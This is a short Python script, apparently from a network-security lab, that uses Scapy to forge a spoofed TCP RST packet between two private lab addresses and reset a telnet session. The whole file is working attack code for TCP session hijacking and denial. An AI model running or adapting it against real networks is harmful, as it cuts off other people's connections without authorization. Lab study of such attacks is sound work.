#!/usr/bin/python3
import sys
from scapy.all import *

print("SENDING RST PACKET.........")

IPLayer = IP(src="10.0.2.4", dst="10.0.2.15")
TCPLayer = TCP(sport=23, dport=50860,flags="R", seq=44616454)
pkt = IPLayer/TCPLayer

pkt.show()
send(pkt, verbose=0)
